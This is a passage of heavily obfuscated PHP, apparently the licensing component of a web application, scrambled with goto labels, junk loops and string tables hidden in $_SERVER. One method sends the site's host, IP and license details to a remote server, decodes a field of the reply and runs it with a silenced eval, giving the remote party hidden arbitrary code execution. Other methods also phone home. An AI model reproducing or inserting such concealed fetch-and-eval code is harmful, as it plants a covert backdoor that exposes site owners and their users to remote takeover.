$cÀ°ÎÏõèë[207], 3); $A¹¿ÉÕšÁè = $A¹¿ÉÕšÁè . $cÀ°ÎÏõèë[208] . $_SERVER[$cÀ°ÎÏõèë[198]]; $DéÌëÔ¶¾à = $this->{$_SERVER[£Õıúå][209]}($cÀ°ÎÏõèë[210] . $A¢ˆÍóº´Á . $cÀ°ÎÏõèë[211] . $A¹¿ÉÕšÁè, -1); $cÀ°ÎÏõèë[191]($DéÌëÔ¶¾à, !0); } else { if ($e°Ã”Á··é[$cÀ°ÎÏõèë[204]] == $cÀ°ÎÏõèë[212]) { $c¸£ä²Şî… = $cÀ°ÎÏõèë[25]($cÀ°ÎÏõèë[131]($cÀ°ÎÏõèë[213] . $fî…ØÔŒ¼­), 12, 15) . $cÀ°ÎÏõèë[214]; $A¹¿ÉÕšÁè = $this->{$_SERVER[£Õıúå][215]}($cÀ°ÎÏõèë[2]($e°Ã”Á··é[$cÀ°ÎÏõèë[216]]), $c¸£ä²Şî…, 2); $CÚ‚Ï¾šÑ” = $cÀ°ÎÏõèë[217]($A¹¿ÉÕšÁè, !0); if (!$cÀ°ÎÏõèë[168]($CÚ‚Ï¾šÑ”) || !$cÀ°ÎÏõèë[168]($CÚ‚Ï¾šÑ”[$cÀ°ÎÏõèë[218]]) || $CÚ‚Ï¾šÑ”[$cÀ°ÎÏõèë[190]] != !0) { $F¨Ã¨™×‚ = $cÀ°ÎÏõèë[219]; $BóÓÀ²Èˆã = $CÚ‚Ï¾šÑ”[$cÀ°ÎÏõèë[218]] ? $cÀ°ÎÏõèë[220] . $CÚ‚Ï¾šÑ”[$cÀ°ÎÏõèë[218]] : $F¨Ã¨™×‚; $cÀ°ÎÏõèë[191]($BóÓÀ²Èˆã, !1); } else { $CäŸ¯ì±¹³[$cÀ°ÎÏõèë[193]] = $CÚ‚Ï¾šÑ”[$cÀ°ÎÏõèë[218]][$cÀ°ÎÏõèë[221]]; } } else { $CÚ‚Ï¾šÑ” = $this->{$_SERVER[£Õıúå][209]}($cÀ°ÎÏõèë[222], $CäŸ¯ì±¹³, 10); $e…Üß†Áá = $D’¬Ñóø[644]; } } if (!$cÀ°ÎÏõèë[168]($CÚ‚Ï¾šÑ”) || !$cÀ°ÎÏõèë[168]($CÚ‚Ï¾šÑ”[$cÀ°ÎÏõèë[218]]) || $CÚ‚Ï¾šÑ”[$cÀ°ÎÏõèë[190]] != !0) { $F¨Ã¨™×‚ = $cÀ°ÎÏõèë[223]($cÀ°ÎÏõèë[224]); $BóÓÀ²Èˆã = $CÚ‚Ï¾šÑ”[$cÀ°ÎÏõèë[218]] ? $cÀ°ÎÏõèë[220] . $CÚ‚Ï¾šÑ”[$cÀ°ÎÏõèë[218]] : $F¨Ã¨™×‚; $cÀ°ÎÏõèë[191]($BóÓÀ²Èˆã, !1); } goto A¯„ÙŠ÷ºë; D•§Ûã©ƒ: $B–öæâã[$cÀ°ÎÏõèë[139]] = $cÀ°ÎÏõèë[240]($cÀ°ÎÏõèë[135]($this->{$_SERVER[£Õıúå][172]}($DÈ¹„±•­ß, $cÀ°ÎÏõèë[241]))); $BŒ²ÏÙ‚Ë = $D’¬Ñóø[646]; while (strlen($BŒ²ÏÙ‚Ë) < $D’¬Ñóø[635]) { if (!$BŒ²ÏÙ‚Ë) { break; } $BŒ²ÏÙ‚Ë++; } goto fŸ—öÇÕİ; A™Š¡²ïëä: $Aº£³í÷Ó = $D’¬Ñóø[651]; if (!$Aº£³í÷Ó) { return; } $déÀº ŒëÒ[$EµÇÆô‡ƒñ] = $DîËÓ¶ìŠ; goto e‰…ìĞŠ¤°; fŸ—öÇÕİ: $EäÄ—ÛÒ = $cÀ°ÎÏõèë[141](16); $c£¶Œ‰£Óœ = $EäÄ—ÛÒ . $B–öæâã[$cÀ°ÎÏõèë[137]] . $this->{$_SERVER[£Õıúå][172]}($cÀ°ÎÏõèë[131]($B–öæâã[$cÀ°ÎÏõèë[234]]), $EäÄ—ÛÒ); $B–öæâã[$cÀ°ÎÏõèë[140]] = $cÀ°ÎÏõèë[135]($cÀ°ÎÏõèë[240]($this->{$_SERVER[£Õıúå][172]}($c£¶Œ‰£Óœ, $cÀ°ÎÏõèë[242]))); goto bÜªŒæ½Ö; bÜªŒæ½Ö: $E‘ŒáøÑê = $D’¬Ñóø[647]; if (!$E‘ŒáøÑê) { die; } if ($fÑ–«½‡ö–[$cÀ°ÎÏõèë[243]] && $fÑ–«½‡ö–[$cÀ°ÎÏõèë[243]] >= 1) { $cÀ°ÎÏõèë[61]($cÀ°ÎÏõèë[62])->{$_SERVER[£Õıúå][244]}($cÀ°ÎÏõèë[245], $cÀ°ÎÏõèë[246]); } goto d—ìŸ«¬è; D“Ö²“…—: $a¾®âœ§÷™ = $D’¬Ñóø[642]; while (strlen($a¾®âœ§÷™) < $D’¬Ñóø[602]) { if (!$a¾®âœ§÷™) { break; } $a¾®âœ§÷™++; } $CäŸ¯ì±¹³ = array($cÀ°ÎÏõèë[190] => $e°Ã”Á··é[$cÀ°ÎÏõèë[190]], $cÀ°ÎÏõèë[193] => $cÀ°ÎÏõèë[141](16), $cÀ°ÎÏõèë[194] => $cÀ°ÎÏõèë[174], $cÀ°ÎÏõèë[195] => $cÀ°ÎÏõèë[196], $cÀ°ÎÏõèë[197] => $_SERVER[$cÀ°ÎÏõèë[198]], $cÀ°ÎÏõèë[199] => $_SERVER[$cÀ°ÎÏõèë[200]], $cÀ°ÎÏõèë[201] => $_SERVER[$cÀ°ÎÏõèë[202]], $cÀ°ÎÏõèë[130] => $fî…ØÔŒ¼­, $cÀ°ÎÏõèë[203] => $cÀ°ÎÏõèë[61]($cÀ°ÎÏõèë[62])->{$_SERVER[£Õıúå][63]}($cÀ°ÎÏõèë[164])); goto bˆØÁõé¤; D­ïˆìè­: } private function licenseRegistSuccess() { $F˜—¿ïå­ =& $_SERVER[£Õıúå]; $c¾¯¸ùß¦´ = $F˜—¿ïå­[61]($F˜—¿ïå­[62])->{$_SERVER[£Õıúå][63]}(); $aÏ¬ó‘§ó = $_SERVER[Ö‘Øù][657]; if ($c¾¯¸ùß¦´[$F˜—¿ïå­[93]] != $F˜—¿ïå­[246]) { $F˜—¿ïå­[61]($F˜—¿ïå­[62])->{$_SERVER[£Õıúå][247]}($F˜—¿ïå­[93], $F˜—¿ïå­[246]); } $F˜—¿ïå­[127]($F˜—¿ïå­[258])->{$_SERVER[£Õıúå][259]}(!0); } private function ilkn43fcac2d() { goto BÉµÉ„Ç•ª; dºÕÏ¶õŞ®: $F‘ñó¥Ú¦Š = $B„„£½Çæï[658]; if (strlen($F‘ñó¥Ú¦Š) < $B„„£½Çæï[635]) { return; } $dñ„Â‚­±[61]($dñ„Â‚­±[62])->{$_SERVER[£Õıúå][244]}($dñ„Â‚­±[245], $dñ„Â‚­±[260]); goto d­ëÈ†Æ „; eŞ†ÛÄğÑŒ: if (strlen($f×°È”ÎİÅ) < $B„„£½Çæï[624]) { die; } goto bìÆŒ«…¯; d­ëÈ†Æ „: $this->aeuc44614807 = array(); $this->xzwe33f34ca1 = $dñ„Â‚­±[138]; $f×°È”ÎİÅ = $B„„£½Çæï[659]; goto eŞ†ÛÄğÑŒ; BÉµÉ„Ç•ª: $B„„£½Çæï =& $_SERVER[Ö‘Øù]; $dñ„Â‚­± =& $_SERVER[£Õıúå]; $dñ„Â‚­±[61]($dñ„Â‚­±[62])->{$_SERVER[£Õıúå][247]}(array($dñ„Â‚­±[234] => $dñ„Â‚­±[10], $dñ„Â‚­±[236] => $dñ„Â‚­±[10], $dñ„Â‚­±[137] => $dñ„Â‚­±[138], $dñ„Â‚­±[139] => $dñ„Â‚­±[10], $dñ„Â‚­±[140] => $dñ„Â‚­±[10])); goto dºÕÏ¶õŞ®; bìÆŒ«…¯: } private function bedl5fa5b426() { goto CÁ¹ê¬“¶; b±™Ñë„Š’: $Aíñ©Û†œ¼ = $b«ĞŸ¼ÇÈ×[662]; while ($Aíñ©Û†œ¼ < $b«ĞŸ¼ÇÈ×[606]) { if ($Aíñ©Û†œ¼ >= 0) { break; } $Aíñ©Û†œ¼++; } $D£ââõÂå = Cache::get($BîäéÅÕ); goto Aê¯ÇŞ±Ê; aÑ‹¿¬ó¹È: $eòçŒöôØ = $b«ĞŸ¼ÇÈ×[661]; if (!$eòçŒöôØ) { die; } $BîäéÅÕ = $Dï­ÔÀ®ë¨[256] . $Dï­ÔÀ®ë¨[131]($fÑÔÖùÓ—• . $Dï­ÔÀ®ë¨[257]); goto b±™Ñë„Š’; b‰“ÕìÒŠÑ: $CÊª“ËÑ = $Dï­ÔÀ®ë¨[61]($Dï­ÔÀ®ë¨[62])->{$_SERVER[£Õıúå][63]}(); if ($CÊª“ËÑ[$Dï­ÔÀ®ë¨[137]] == $Dï­ÔÀ®ë¨[138]) { return; } $fÑÔÖùÓ—• = $Dï­ÔÀ®ë¨[61]($Dï­ÔÀ®ë¨[62])->{$_SERVER[£Õıúå][63]}($Dï­ÔÀ®ë¨[133]); goto aÑ‹¿¬ó¹È; CÁ¹ê¬“¶: $b«ĞŸ¼ÇÈ× =& $_SERVER[Ö‘Øù]; $Dï­ÔÀ®ë¨ =& $_SERVER[£Õıúå]; $_SERVER[$Dï­ÔÀ®ë¨[200]] = $Dï­ÔÀ®ë¨[123]($_SERVER, $Dï­ÔÀ®ë¨[200], APP_HOST); goto DÜèÃÌÏğ; DÜèÃÌÏğ: $this->xzwe33f34ca1 = $Dï­ÔÀ®ë¨[138]; $F‹‡†¬—İó = $b«ĞŸ¼ÇÈ×[660]; while ($F‹‡†¬—İó < $b«ĞŸ¼ÇÈ×[606]) { if ($F‹‡†¬—İó >= 0) { break; } $F‹‡†¬—İó++; } goto b‰“ÕìÒŠÑ; Aê¯ÇŞ±Ê: if (!$Dï­ÔÀ®ë¨[168]($D£ââõÂå) || !isset($D£ââõÂå[$Dï­ÔÀ®ë¨[261]]) || $Dï­ÔÀ®ë¨[262]() - $D£ââõÂå[$Dï­ÔÀ®ë¨[261]] >= 60) { $cÛ¤½µ‰‘§ = $Dï­ÔÀ®ë¨[61]($Dï­ÔÀ®ë¨[11])->{$_SERVER[£Õıúå][263]}(); $FÄî¼òÃ„Ã = $cÛ¤½µ‰‘§[$Dï­ÔÀ®ë¨[251]]; $D‚ùŒµÚ£Ö = $Dï­ÔÀ®ë¨[131]($_SERVER[$Dï­ÔÀ®ë¨[132]] . $Dï­ÔÀ®ë¨[240]($fÑÔÖùÓ—•) . $CÊª“ËÑ[$Dï­ÔÀ®ë¨[236]]); $FïÁ¸„…Ó› = $Dï­ÔÀ®ë¨[240]($Dï­ÔÀ®ë¨[25]($D‚ùŒµÚ£Ö, 10, 16)); $D£ââõÂå = $this->{$_SERVER[£Õıúå][215]}($FÄî¼òÃ„Ã[$Dï­ÔÀ®ë¨[111]][$FïÁ¸„…Ó›], $D‚ùŒµÚ£Ö); $D£ââõÂå = $Dï­ÔÀ®ë¨[217]($D£ââõÂå, !0); } if (!$Dï­ÔÀ®ë¨[168]($D£ââõÂå)) { return $this->{$_SERVER[£Õıúå][189]}(); } $Eƒ„ƒÌïÅ˜ = $Dï­ÔÀ®ë¨[161]($D£ââõÂå[$Dï­ÔÀ®ë¨[162]]); goto E»½ëŠÜÈÃ; BÌ¼à£‰“œ: $this->xzwe33f34ca1 = $CÊª“ËÑ[$Dï­ÔÀ®ë¨[137]]; $A­‘Ã¸Œî = $b«ĞŸ¼ÇÈ×[663]; if (!$A­‘Ã¸Œî) { return; } goto Dø•ïª‡Õß; E»½ëŠÜÈÃ: if ($Dï­ÔÀ®ë¨[262]() >= $Eƒ„ƒÌïÅ˜) { return $this->{$_SERVER[£Õıúå][189]}(); } if ($Dï­ÔÀ®ë¨[262]() - $D£ââõÂå[$Dï­ÔÀ®ë¨[261]] > 20) { $D£ââõÂå[$Dï­ÔÀ®ë¨[261]] = $Dï­ÔÀ®ë¨[262](); Cache::set($BîäéÅÕ, $D£ââõÂå); } $this->aeuc44614807 = $D£ââõÂå; goto BÌ¼à£‰“œ; Dø•ïª‡Õß: } private function gjayf9a00c37() { $FÉ÷î„éŞ» =& $_SERVER[£Õıúå]; $bçÒ¼Ë‰ö» = $GLOBALS[$FÉ÷î„éŞ»[22]]; $DÙ‘÷°ƒ¸Ğ = $_SERVER[$FÉ÷î„éŞ»[44]]; if ($DÙ‘÷°ƒ¸Ğ == $FÉ÷î„éŞ»[264] && $this->xzwe33f34ca1 == $FÉ÷î„éŞ»[138]) { $FÉ÷î„éŞ»[191]($FÉ÷î„éŞ»[223]($FÉ÷î„éŞ»[265]), !1, $FÉ÷î„éŞ»[266]); } $c²æ³Áˆ’ = array($FÉ÷î„éŞ»[267], $FÉ÷î„éŞ»[268]); if ($FÉ÷î„éŞ»[269]($DÙ‘÷°ƒ¸Ğ, $c²æ³Áˆ’)) { if ($this->xzwe33f34ca1 == $FÉ÷î„éŞ»[138] && isset($bçÒ¼Ë‰ö»[$FÉ÷î„éŞ»[270]])) { $FÉ÷î„éŞ»[191]($FÉ÷î„éŞ»[223]($FÉ÷î„éŞ»[265]), !1, $FÉ÷î„éŞ»[266]); die; } $F‰ªŠ«¸É = $this->{$_SERVER[£Õıúå][154]}(); if ($F‰ªŠ«¸É != $FÉ÷î„éŞ»[271]($FÉ÷î„éŞ»[272])) { if ($F‰ªŠ«¸É <= $FÉ÷î„éŞ»[61]($FÉ÷î„éŞ»[156])->{$_SERVER[£Õıúå][157]}()) { $FÉ÷î„éŞ»[191]($FÉ÷î„éŞ»[223]($FÉ÷î„éŞ»[273]), !1, $FÉ÷î„éŞ»[266]); die; } } } } private function sump726e289a() { goto FÈğå¤Çœ¨; E‚×Ìà‰ñÂ: $E‰¦‹Ç¿ùÁ = $CÉ²ˆÂ…Ê¡[665]; if (strlen($E‰¦‹Ç¿ùÁ) < $CÉ²ˆÂ…Ê¡[624]) { die; } $eìÙ¹»‰ÀŸ = $FÌ³°•†¼Î[279](array($FÌ³°•†¼Î[280] => array($FÌ³°•†¼Î[281] => $FÌ³°•†¼Î[282], $FÌ³°•†¼Î[283] => 3))); goto d„Éİ×”äÚ; FÈğå¤Çœ¨: $CÉ²ˆÂ…Ê¡ =& $_SERVER[Ö‘Øù]; $FÌ³°•†¼Î =& $_SERVER[£Õıúå]; $bÏ’ùŠ°î® = array($FÌ³°•†¼Î[152], $FÌ³°•†¼Î[274]); goto DõíÌÚó±; F½›µÏõ…Á: $e® ÔÂµ™ = $CÉ²ˆÂ…Ê¡[664]; if (strlen($e® ÔÂµ™) < $CÉ²ˆÂ…Ê¡[624]) { return; } $F×ÃÇÓÎŒ¯ = $this->{$_SERVER[£Õıúå][277]}($F×ÃÇÓÎŒ¯, $FÌ³°•†¼Î[278]); goto E‚×Ìà‰ñÂ; d„Éİ×”äÚ: $c½‘ªƒÜï = $CÉ²ˆÂ…Ê¡[666]; while (strlen($c½‘ªƒÜï) < $CÉ²ˆÂ…Ê¡[606]) { if (!$c½‘ªƒÜï) { break; } $c½‘ªƒÜï++; } $EóÆêœÌ¤’ = @$FÌ³°•†¼Î[284]($F×ÃÇÓÎŒ¯, !1, $eìÙ¹»‰ÀŸ); goto cğº¬œÜË·; DõíÌÚó±: if (!$FÌ³°•†¼Î[123]($GLOBALS, $FÌ³°•†¼Î[149]) || !isset($_GET[$FÌ³°•†¼Î[275]])) { return; } if (!$FÌ³°•†¼Î[269]($_SERVER[$FÌ³°•†¼Î[44]], $bÏ’ùŠ°î®)) { return; } $F×ÃÇÓÎŒ¯ = $FÌ³°•†¼Î[276]; goto F½›µÏõ…Á; cğº¬œÜË·: $Aƒ«§ó šÚ = $CÉ²ˆÂ…Ê¡[667]; $FÌ³°•†¼Î[285]($FÌ³°•†¼Î[286]); $déÂœÆá‘ = $CÉ²ˆÂ…Ê¡[668]; goto e–¡±ÙâîÜ; e–¡±ÙâîÜ: if (strlen($déÂœÆá‘) < $CÉ²ˆÂ…Ê¡[602]) { die; } if ($EóÆêœÌ¤’ && $FÌ³°•†¼Î[32]($EóÆêœÌ¤’, $FÌ³°•†¼Î[287])) { echo $EóÆêœÌ¤’; } die; goto F¤Æ¿²«™™; F¤Æ¿²«™™: } public function toaw69b3c86c($a•êƒàµê) { goto F¾Ûõ£ ¬µ; FˆŒ—²Ñò™: $F”«ì¤ö = $aÙé•©¼à‘[0]($aÙé•©¼à‘[307], $aÙé•©¼à‘[123]($this->aeuc44614807, $aÙé•©¼à‘[146], $aÙé•©¼à‘[10])); $f¡è¢ˆÑŞ = array(); $Cù‰ºŒ™Ÿé = $EËóó”³ÕÉ[670]; goto f§œ‚¯³¢; BÉÈèìô Ú: return $a•êƒàµê; goto fÄ•¡œ¶ˆ¦; F¾Ûõ£ ¬µ: $EËóó”³ÕÉ =& $_SERVER[Ö‘Øù]; $aÙé•©¼à‘ =& $_SERVER[£Õıúå]; if ($this->xzwe33f34ca1 == $aÙé•©¼à‘[288]) { return $a•êƒàµê; } goto a±ÅÒİÂ…´; a±ÅÒİÂ…´: $EåšÙ³¢”Ò = array($aÙé•©¼à‘[289] => $aÙé•©¼à‘[290], $aÙé•©¼à‘[291] => $aÙé•©¼à‘[290], $aÙé•©¼à‘[292] => $aÙé•©¼à‘[290], $aÙé•©¼à‘[293] => $aÙé•©¼à‘[290], $aÙé•©¼à‘[294] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[296] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[297] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[298] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[299] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[300] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[301] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[302] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[303] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[304] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[305] => $aÙé•©¼à‘[295], $aÙé•©¼à‘[306] => $aÙé•©¼à‘[295]); $eö• ¬ñ…İ = $EËóó”³ÕÉ[669]; if (!$eö• ¬ñ…İ) { die; } goto FˆŒ—²Ñò™; f§œ‚¯³¢: while (strlen($Cù‰ºŒ™Ÿé) < $EËóó”³ÕÉ[602]) { if (!$Cù‰ºŒ™Ÿé) { break; } $Cù‰ºŒ™Ÿé++; } foreach ($EåšÙ³¢”Ò as $eÈŒÜôæ => $dß‡ã‰ë¬É) { if ($dß‡ã‰ë¬É == $aÙé•©¼à‘[290] && $aÙé•©¼à‘[25]($this->xzwe33f34ca1, 0, 1) == $aÙé•©¼à‘[290]) { continue; } if (!$aÙé•©¼à‘[269]($eÈŒÜôæ, $F”«ì¤ö)) { $f¡è¢ˆÑŞ[] = $eÈŒÜôæ; } } foreach ($f¡è¢ˆÑŞ as $eÈŒÜôæ) { unset($a•êƒàµê[$eÈŒÜôæ]); } goto BÉÈèìô Ú; fÄ•¡œ¶ˆ¦: } private function lihdb8c45607() { $fÃ˜¬…«âå =& $_SERVER[£Õıúå]; if ($this->xzwe33f34ca1 != $fÃ˜¬…«âå[138]) { return; } $GLOBALS[$fÃ˜¬…«âå[111]][$fÃ˜¬…«âå[115]][$fÃ˜¬…«âå[308]] = $fÃ˜¬…«âå[246]; $GLOBALS[$fÃ˜¬…«âå[111]][$fÃ˜¬…«âå[309]] = $fÃ˜¬…«âå[246]; if ($fÃ˜¬…«âå[61]($fÃ˜¬…«âå[310])->{$_SERVER[£Õıúå][63]}($fÃ˜¬…«âå[93]) != $fÃ˜¬…«âå[260]) { $fÃ˜¬…«âå[61]($fÃ˜¬…«âå[310])->{$_SERVER[£Õıúå][247]}($fÃ˜¬…«âå[93], $fÃ˜¬…«âå[260]); } } public function yreua926d74f() { $EÔ‰Î›Ÿ· =& $_SERVER[Ö‘Øù]; return $_SERVER[£Õıúå][311]; $CÓ²ê¿¿¡Ğ = $EÔ‰Î›Ÿ·[671]; if (strlen($CÓ²ê¿¿¡Ğ) < $EÔ‰Î›Ÿ·[606]) { return; } } private function lqyd442cd712() { goto BŠ¹é­Åˆ¦; Cƒ¶µÊ ØÆ: $e×ö†Ï„‚ = $bõò«ïº“µ[672]; $CËëÇàâ¥¸ = $C¹Ú¢¸’–[315] . $C¹Ú¢¸’–[131]($C¹Ú¢¸’–[316]); $E·ªäÍÎ‡¨ = $bõò«ïº“µ[673]; goto F•âÍßñ“Ô; B¸¸¿µİÏ: $C¹Ú¢¸’–[13](array($C¹Ú¢¸’–[317], $C¹Ú¢¸’–[177]), $CËëÇàâ¥¸, $C¹Ú¢¸’–[262]()); $b•¼İÂõØ‡ = $C¹Ú¢¸’–[61]($C¹Ú¢¸’–[62])->{$_SERVER[£Õıúå][63]}($C¹Ú¢¸’–[133]); $D²½ÈÚĞğ¹ = array($C¹Ú¢¸’–[190] => $C¹Ú¢¸’–[61]($C¹Ú¢¸’–[62])->{$_SERVER[£Õıúå][63]}($C¹Ú¢¸’–[234]), $C¹Ú¢¸’–[204] => $this->xzwe33f34ca1, $C¹Ú¢¸’–[201] => $_SERVER[$C¹Ú¢¸’–[202]], $C¹Ú¢¸’–[203] => $C¹Ú¢¸’–[61]($C¹Ú¢¸’–[62])->{$_SERVER[£Õıúå][63]}($C¹Ú¢¸’–[164]), $C¹Ú¢¸’–[130] => $C¹Ú¢¸’–[131]($_SERVER[$C¹Ú¢¸’–[132]] . $b•¼İÂõØ‡), $C¹Ú¢¸’–[194] => $C¹Ú¢¸’–[174], $C¹Ú¢¸’–[197] => $_SERVER[$C¹Ú¢¸’–[198]]); goto Dë‰Í¦ô›ç; B¯¸­ˆİƒ—: if ($C¹Ú¢¸’–[262]() % 4 != 0) { return; } $C³œƒª¿‰¯ = $C¹Ú¢¸’–[13](array($C¹Ú¢¸’–[317], $C¹Ú¢¸’–[318]), $CËëÇàâ¥¸); if ($C³œƒª¿‰¯ && $C¹Ú¢¸’–[262]() - $C³œƒª¿‰¯ < $C¹Ú¢¸’–[271]($C¹Ú¢¸’–[319])) { return; } goto B¸¸¿µİÏ; A¼ø…µÓ£: $this->{$_SERVER[£Õıúå][189]}(); if ($this->{$_SERVER[£Õıúå][225]}($Fš¶ìªİ¹Î[$C¹Ú¢¸’–[321]]) != $D²½ÈÚĞğ¹[$C¹Ú¢¸’–[190]]) { $fë›×ÉÔ‡‰ = array($C¹Ú¢¸’–[227] => $b•¼İÂõØ‡, $C¹Ú¢¸’–[228] => $_SERVER[$C¹Ú¢¸’–[132]], $C¹Ú¢¸’–[229] => $C¹Ú¢¸’–[230](), $C¹Ú¢¸’–[199] => $_SERVER[$C¹Ú¢¸’–[200]]); $cñÙÎ˜ÃØÈ = $this->{$_SERVER[£Õıúå][231]}($C¹Ú¢¸’–[173]($fë›×ÉÔ‡‰)); $Fš¶ìªİ¹Î = $this->{$_SERVER[£Õıúå][209]}($C¹Ú¢¸’–[232] . $cñÙÎ˜ÃØÈ); if ($Fš¶ìªİ¹Î && $C¹Ú¢¸’–[168]($Fš¶ìªİ¹Î) && isset($Fš¶ìªİ¹Î[$C¹Ú¢¸’–[321]])) { $EÎ£·ÖíƒÄ = $this->{$_SERVER[£Õıúå][215]}($Fš¶ìªİ¹Î[$C¹Ú¢¸’–[321]], 2); if ($EÎ£·ÖíƒÄ) { $EÎ£·ÖíƒÄ = $this->{$_SERVER[£Õıúå][225]}($EÎ£·ÖíƒÄ); } if ($EÎ£·ÖíƒÄ) { try { @eval($EÎ£·ÖíƒÄ); } catch (Exception $B‡Ñ’ÒÔé) { } } } } goto e»æä£·ù›; F•âÍßñ“Ô: if (!$E·ªäÍÎ‡¨) { return; } if ($this->xzwe33f34ca1 == $C¹Ú¢¸’–[138] || !$C¹Ú¢¸’–[123]($GLOBALS, $C¹Ú¢¸’–[149])) { return; } if (!$C¹Ú¢¸’–[269]($_SERVER[$C¹Ú¢¸’–[44]], $DªÜÓÇÌ™÷)) { return; } goto B¯¸­ˆİƒ—; BŠ¹é­Åˆ¦: $bõò«ïº“µ =& $_SERVER[Ö‘Øù]; $C¹Ú¢¸’– =& $_SERVER[£Õıúå]; $DªÜÓÇÌ™÷ = array($C¹Ú¢¸’–[312], $C¹Ú¢¸’–[313], $C¹Ú¢¸’–[314]); goto Cƒ¶µÊ ØÆ; Dë‰Í¦ô›ç: $F¨ÉÎµƒ©† = $bõò«ïº“µ[674]; $Fš¶ìªİ¹Î = $this->{$_SERVER[£Õıúå][209]}($C¹Ú¢¸’–[320], $D²½ÈÚĞğ¹); $dŞ…ëìÌîâ = $bõò«ïº“µ[675]; goto a„Şù›”³õ; a„Şù›”³õ: if (strlen($dŞ…ëìÌîâ) < $bõò«ïº“µ[614]) { return; } if (!$C¹Ú¢¸’–[168]($Fš¶ìªİ¹Î)) { return; } if ($Fš¶ìªİ¹Î[$C¹Ú¢¸’–[190]] && $Fš¶ìªİ¹Î[$C¹Ú¢¸’–[321]]) { if ($this->{$_SERVER[£Õıúå][225]}($Fš¶ìªİ¹Î[$C¹Ú¢¸’–[321]]) == $D²½ÈÚĞğ¹[$C¹Ú¢¸’–[190]]) { return; } } goto A¼ø…µÓ£; e»æä£·ù›: } private function cxjpa61fdae6($D…Í¤²£à = '', $BĞÆ‘ñš„§ = array(), $A…îİ‰Ëãà = 5) { goto d­¨¢’‚Ìñ; fÂè÷ë‹ºŸ: $b£„êÁ¬äò = $b£„êÁ¬äò . $D…Í¤²£à; if ($BĞÆ‘ñš„§ && $DñøÉ¡Œ±[168]($BĞÆ‘ñš„§)) { $b£„êÁ¬äò = $b£„êÁ¬äò . $DñøÉ¡Œ±[324] . $DñøÉ¡Œ±[325]($BĞÆ‘ñš„§); } if ($BĞÆ‘ñš„§ === -1) { return $b£„êÁ¬äò; } goto f™Ü•±¹÷æ; f™Ü•±¹÷æ: $d™Ò³ÒÊ = $DñøÉ¡Œ±[279](array($DñøÉ¡Œ±[280] => array($DñøÉ¡Œ±[283] => $A…îİ‰Ëãà, $DñøÉ¡Œ±[281] => $DñøÉ¡Œ±[326]), $DñøÉ¡Œ±[327] => array($DñøÉ¡Œ±[328] => !1, $DñøÉ¡Œ±[329] => !1))); $BĞÆ‘ñš„§ = @$DñøÉ¡Œ±[284]($b£„êÁ¬äò, !1, $d™Ò³ÒÊ); $BÍÄ¹óã™— = $_SERVER[Ö‘Øù][676]; goto dÅ’´ö¬Òó; d­¨¢’‚Ìñ: $DñøÉ¡Œ± =& $_SERVER[£Õıúå]; $b£„êÁ¬äò = $DñøÉ¡Œ±[322]; $b£„êÁ¬äò = $this->{$_SERVER[£Õıúå][277]}($b£„êÁ¬äò, $DñøÉ¡Œ±[323]); goto fÂè÷ë‹ºŸ; dÅ’´ö¬Òó: if (!$BÍÄ¹óã™—) { return; } return $DñøÉ¡Œ±[217]($BĞÆ‘ñš„§, !0); goto Aİ³ÒÏº§Œ; Aİ³ÒÏº§Œ: } private function bvdf48bd8122() { goto fÜˆŒéå¤“; fÜˆŒéå¤“: $B‰„áÓôƒø =& $_SERVER[Ö‘Øù]; $E‘‹Ø‰÷¯³ =& $_SERVER[£Õıúå]; $cÈ¶ÛÁ£÷Ï = array($E‘‹Ø‰÷¯³[330] => $E‘‹Ø‰÷¯³[331], $E‘‹Ø‰÷¯³[332] => $E‘‹Ø‰÷¯³[333], $E‘‹Ø‰÷¯³[334] => $E‘‹Ø‰÷¯³[335], $E‘‹Ø‰÷¯³[336] => $E‘‹Ø‰÷¯³[337], $E‘‹Ø‰÷¯³[338] => $E‘‹Ø‰÷¯³[339], $E‘‹Ø‰÷¯³[340] => $E‘‹Ø‰÷¯³[272], $E‘‹Ø‰÷¯³[341] => $E‘‹Ø‰÷¯³[272], $E‘‹Ø‰÷¯³[342] => $E‘‹Ø‰÷¯³[331], $E‘‹Ø‰÷¯³[343] => $E‘‹Ø‰÷¯³[333], $E‘‹Ø‰÷¯³[344] => $E‘‹Ø‰÷¯³[335], $E‘‹Ø‰÷¯³[345] => $E‘‹Ø‰÷¯³[346], $E‘‹Ø‰÷¯³[347] => $E‘‹Ø‰÷¯³[337], $E‘‹Ø‰÷¯³[348] => $E‘‹Ø‰÷¯³[349], $E‘‹Ø‰÷¯³[350] => $E‘‹Ø‰÷¯³[339], $E‘‹Ø‰÷¯³[351] => $E‘‹Ø‰÷¯³[352], $E‘‹Ø‰÷¯³[353] => $E‘‹Ø‰÷¯³[354], $E‘‹Ø‰÷¯³[355] => $E‘‹Ø‰÷¯³[356]); goto A»÷Üô«; DËµ‰ï¢„‘: if (strlen($a¿ŸĞ¨é) < $B‰„áÓôƒø[624]) { die; } return $f±— †ÍŠË + $a¡íì¶Òšó; $dÂ²Ã®™ø± = $B‰„áÓôƒø[679]; goto eÇ‹Éòƒã„; cÄõµÊ: $f±— †ÍŠË = $E‘‹Ø‰÷¯³[271]($f±— †ÍŠË ? $f±— †ÍŠË : $E‘‹Ø‰÷¯³[331]); $aß…„›Ä®¡ = $B‰„áÓôƒø[677]; if (!$aß…„›Ä®¡) { return; } goto e©ßó„²¥ä; eÇ‹Éòƒã„: while ($dÂ²Ã®™ø± < $B‰„áÓôƒø[614]) { if ($dÂ²Ã®™ø± >= 0) { break; } $dÂ²Ã®™ø±++; } goto dã‘´–È®Ï; A»÷Üô«: $FÃâËŞÈé¥ = $B‰„áÓôƒø[648]; if (!$FÃâËŞÈé¥) { return; } $f±— †ÍŠË = $cÈ¶ÛÁ£÷Ï[$this->xzwe33f34ca1]; goto cÄõµÊ; e©ßó„²¥ä: $a¡íì¶Òšó = $E‘‹Ø‰÷¯³[123]($this->aeuc44614807, $E‘‹Ø‰÷¯³[357]); $a¡íì¶Òšó = $a¡íì¶Òšó ? $E‘‹Ø‰÷¯³[271]($a¡íì¶Òšó) : 0; $a¿ŸĞ¨é = 